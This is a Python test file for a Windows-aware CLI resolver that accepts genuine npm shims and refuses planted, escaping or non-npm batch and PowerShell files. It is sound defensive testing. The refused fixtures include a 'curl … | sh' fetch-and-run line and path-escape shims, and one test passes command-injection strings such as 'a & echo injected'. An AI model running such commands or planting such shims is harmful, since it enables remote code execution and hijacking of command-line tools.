"""Fixture shims exercise CLI resolution; no real host CLI or cmd.exe is started."""

import importlib.util
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))
import oaw_common  # noqa: E402
from oaw_common import resolve_cli, resolver_sha256  # noqa: E402

# The shapes npm's cmd-shim writes for a node script and for a native executable.
CMD_HEAD = "@ECHO off\r\nGOTO start\r\n:find_dp0\r\nSET dp0=%~dp0\r\nEXIT /b\r\n:start\r\nSETLOCAL\r\nCALL :find_dp0\r\n"
NODE_CMD = (CMD_HEAD + '\r\nIF EXIST "%dp0%\\node.exe" (\r\n  SET "_prog=%dp0%\\node.exe"\r\n) ELSE (\r\n'
            '  SET "_prog=node"\r\n  SET PATHEXT=%PATHEXT:;.JS;=;%\r\n)\r\n\r\n'
            'endLocal & goto #_undefined_# 2>NUL || title %COMSPEC% & "%_prog%"  "%dp0%\\node_modules\\fake-cli\\cli.js" %*\r\n')
EXE_CMD = CMD_HEAD + '"%dp0%\\node_modules\\fake-cli\\bin\\fake.exe"   %*\r\n'
PS1_HEAD = ('#!/usr/bin/env pwsh\n$basedir=Split-Path $MyInvocation.MyCommand.Definition -Parent\n\n$exe=""\n'
            'if ($PSVersionTable.PSVersion -lt "6.0" -or $IsWindows) {\n  $exe=".exe"\n}\n')
NODE_PS1 = (PS1_HEAD + 'if (Test-Path "$basedir/node$exe") {\n  & "$basedir/node$exe"  "$basedir/node_modules/fake-cli/cli.js" $args\n'
            '} else {\n  & "node$exe"  "$basedir/node_modules/fake-cli/cli.js" $args\n}\nexit $LASTEXITCODE\n')
EXE_PS1 = PS1_HEAD + '& "$basedir/node_modules/fake-cli/bin/fake.exe"   $args\nexit $LASTEXITCODE\n'


class ResolveCliTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(prefix="oaw-cli-")
        self.addCleanup(self.tmp.cleanup)
        self.root = os.path.abspath(self.tmp.name)
        self.npm = os.path.join(self.root, "npm")

    def write(self, *parts, text=""):
        path = os.path.join(self.root, *parts)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8", newline="") as handle:
            handle.write(text)
        os.chmod(path, 0o755)
        return path

    def test_npm_node_shim_resolves_to_node_and_script(self):
        script = self.write("npm", "node_modules", "fake-cli", "cli.js", text="// fixture\n")
        self.write("npm", "claude.cmd", text=NODE_CMD)
        self.write("npm", "claude.ps1", text=NODE_PS1)
        self.write("npm", "claude", text="#!/bin/sh\n")  # npm's POSIX shim is never picked on Windows
        node = self.write("node", "node.exe")
        search = os.pathsep.join([self.npm, os.path.dirname(node)])
        self.assertEqual(resolve_cli("claude", platform="nt", search_path=search), [node, script])
        beside = self.write("npm", "node.exe")
        for name in ("claude", "claude.cmd", os.path.join(self.npm, "claude.ps1"), os.path.join(self.npm, "claude")):
            with self.subTest(name=name):
                self.assertEqual(resolve_cli(name, platform="nt", search_path=self.npm), [beside, script])

    def test_npm_exe_shim_resolves_to_exe(self):
        exe = self.write("npm", "node_modules", "fake-cli", "bin", "fake.exe")
        self.write("npm", "fake.cmd", text=EXE_CMD)
        self.write("npm", "fake.ps1", text=EXE_PS1)
        self.assertEqual(resolve_cli("fake", platform="nt", search_path=self.npm), [exe])
        self.assertEqual(resolve_cli(os.path.join(self.npm, "fake.ps1"), platform="nt"), [exe])
        direct = self.write("bin", "tool.exe")
        self.assertEqual(resolve_cli("tool", platform="nt", search_path=os.path.dirname(direct)), [direct])

    def test_non_shim_batch_file_is_refused(self):
        self.write("npm", "node_modules", "fake-cli", "cli.js")
        self.write("npm", "node_modules", "fake-cli", "bin", "fake.exe")
        self.write("npm", "outside.exe")
        refused = {
            "plain.cmd": "@echo off\r\ncurl https://example.invalid/x | sh %*\r\n",
            "plain.bat": "@echo off\r\nnode %~dp0\\node_modules\\fake-cli\\cli.js %*\r\n",
            "escape.cmd": CMD_HEAD + '"%dp0%\\node_modules\\..\\outside.exe" %*\r\n',
            "missing.cmd": CMD_HEAD + '"%dp0%\\node_modules\\fake-cli\\gone.exe" %*\r\n',
            "variable.cmd": NODE_CMD.replace("fake-cli\\cli.js", "%PKG%\\cli.js"),
            "program.cmd": NODE_CMD.replace('SET "_prog=node"', 'SET "_prog=sh"'),
            "unset.cmd": CMD_HEAD + '"%_prog%"  "%dp0%\\node_modules\\fake-cli\\cli.js" %*\r\n',
            "kind.cmd": CMD_HEAD + '"%dp0%\\node_modules\\fake-cli\\cli.js" %*\r\n',
            "two.cmd": EXE_CMD + CMD_HEAD + '"%dp0%\\node_modules\\fake-cli\\bin\\other.exe" %*\r\n',
            "large.cmd": NODE_CMD + "REM " + "x" * 8192 + "\r\n",
            "other.ps1": "& cmd /c $args\n",
        }
        for name, text in refused.items():
            path = self.write("npm", name, text=text)
            with self.subTest(name=name), self.assertRaisesRegex(ValueError, "refusing non-npm"):
                resolve_cli(path, platform="nt")

    def test_current_directory_is_not_searched(self):
        planted = os.path.join(self.root, "cwd")
        self.write("cwd", "claude.cmd", text=EXE_CMD)
        self.write("cwd", "node_modules", "fake-cli", "bin", "fake.exe")
        self.write("cwd", "claude.exe")
        self.write("cwd", "claude", text="#!/bin/sh\n")
        previous = os.getcwd()
        os.chdir(planted)
        self.addCleanup(os.chdir, previous)
        relative = os.pathsep.join(["", ".", "cwd", os.curdir + os.sep])
        for platform in ("nt", "posix"):
            with self.subTest(platform=platform), self.assertRaisesRegex(FileNotFoundError, "not searched"):
                resolve_cli("claude", platform=platform, search_path=relative)
        trusted = self.write("npm", "claude.exe")
        self.assertEqual(resolve_cli("claude", platform="nt", search_path=os.pathsep.join([".", self.npm])), [trusted])

    def test_posix_behavior_unchanged(self):
        tool = self.write("bin", "claude", text="#!/bin/sh\n")
        batch = self.write("bin", "claude.cmd", text="@echo off\r\nnot an npm shim\r\n")
        folder = os.path.dirname(tool)
        self.assertEqual(resolve_cli("claude", platform="posix", search_path=folder), [tool])
        self.assertEqual(resolve_cli(batch, platform="posix"), [batch])
        with self.assertRaises(FileNotFoundError):
            resolve_cli("absent-cli", platform="posix", search_path=folder)

    def test_resolver_hash_covers_only_the_resolver_source(self):
        digest = resolver_sha256()
        self.assertRegex(digest, r"^[0-9a-f]{64}$")
        source = Path(oaw_common.__file__).read_text(encoding="utf-8")
        block = source[source.index("# >>> cli resolver"):source.index("# <<< cli resolver")]
        self.assertIn("def resolve_cli(", block)
        self.assertIn("def _npm_shim(", block)
        copy = Path(self.root) / "oaw_common.py"
        for text, same in ((source.replace("\n", "\r\n") + "\ndef unrelated():\n    pass\n", True),
                           (source.replace("_SHIM_LIMIT = 8192", "_SHIM_LIMIT = 8193"), False)):
            copy.write_bytes(text.encode("utf-8"))
            with self.subTest(same=same), patch.object(oaw_common, "__file__", str(copy)):
                self.assertEqual(resolver_sha256() == digest, same)

    def test_lf_sha256_is_the_shared_evidence_hash_basis(self):
        # One basis for new evidence hashes (OAW-02): the pilot's CRLF-folded file digest.
        spec = importlib.util.spec_from_file_location(
            "oaw_pilot_common_probe", Path(__file__).resolve().parents[1] / "evals" / "egm-pilot" / "pilot_common.py")
        pilot = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(pilot)
        sample = Path(self.root) / "sample.txt"
        for data in (b"a\r\nb\r\n", b"a\nb\n", "é\r\n\r\n".encode("utf-8"), b"lone\rcarriage"):
            sample.write_bytes(data)
            with self.subTest(data=data):
                self.assertEqual(oaw_common.lf_sha256(data), pilot.file_digest(sample))
        self.assertEqual(oaw_common.lf_sha256("a\r\nb"), oaw_common.lf_sha256(b"a\nb"))
        self.assertNotEqual(oaw_common.lf_sha256(b"a\rb"), oaw_common.lf_sha256(b"a\nb"))  # a lone CR is content
        self.assertEqual(oaw_common.HASH_BASIS, "sha256, CRLF folded to LF")
        source = Path(oaw_common.__file__).read_bytes().decode("utf-8").replace("\r\n", "\n")
        block = source[source.index("# >>> cli resolver"):source.index("# <<< cli resolver") + len("# <<< cli resolver")]
        self.assertEqual(resolver_sha256(), oaw_common.lf_sha256(block))

    def test_link_inside_node_modules_is_trusted(self):
        # Confinement is lexical: the shim's text may not leave node_modules, but a link there
        # (npm link, a junction) is trusted like the package code it holds (goldfish MS-07).
        checkout = self.write("checkout", "cli.js", text="// linked package\n")
        os.makedirs(os.path.join(self.npm, "node_modules"))
        link = os.path.join(self.npm, "node_modules", "fake-cli")
        try:
            os.symlink(os.path.dirname(checkout), link, target_is_directory=True)
        except (OSError, NotImplementedError) as exc:
            self.skipTest(f"Symlink creation unavailable: {exc}")
        self.write("npm", "claude.cmd", text=NODE_CMD)
        node = self.write("npm", "node.exe")
        self.assertEqual(resolve_cli("claude", platform="nt", search_path=self.npm),
                         [node, os.path.join(link, "cli.js")])
        escape = self.write("npm", "escape.cmd", text=NODE_CMD.replace("node_modules\\fake-cli", "..\\checkout"))
        with self.assertRaisesRegex(ValueError, "refusing non-npm"):
            resolve_cli(escape, platform="nt")

    if os.name == "nt":
        # A junction needs no privilege; it lets a real interpreter stand in for the shim's .exe.
        def test_arguments_with_percent_and_ampersand_pass_verbatim(self):
            import _winapi
            interpreter = getattr(sys, "_base_executable", None) or sys.executable
            os.makedirs(os.path.join(self.npm, "node_modules"))
            link = os.path.join(self.npm, "node_modules", "fake-cli")
            _winapi.CreateJunction(os.path.dirname(interpreter), link)
            self.addCleanup(os.rmdir, link)
            name = os.path.basename(interpreter)
            self.write("npm", "echo.cmd", text=CMD_HEAD + f'"%dp0%\\node_modules\\fake-cli\\{name}"   %*\r\n')
            argv = resolve_cli("echo", search_path=self.npm)
            self.assertEqual(argv, [os.path.join(link, name)])
            values = ["%PATH%", "a & echo injected", "100%", "^|<>", 'say "hi" & exit']
            process = subprocess.run(argv + ["-c", "import json, sys; print(json.dumps(sys.argv[1:]))", *values],
                                     stdin=subprocess.DEVNULL, capture_output=True, text=True, timeout=60)
            self.assertEqual(process.returncode, 0, process.stderr)
            self.assertEqual(json.loads(process.stdout), values)


if __name__ == "__main__":
    unittest.main()
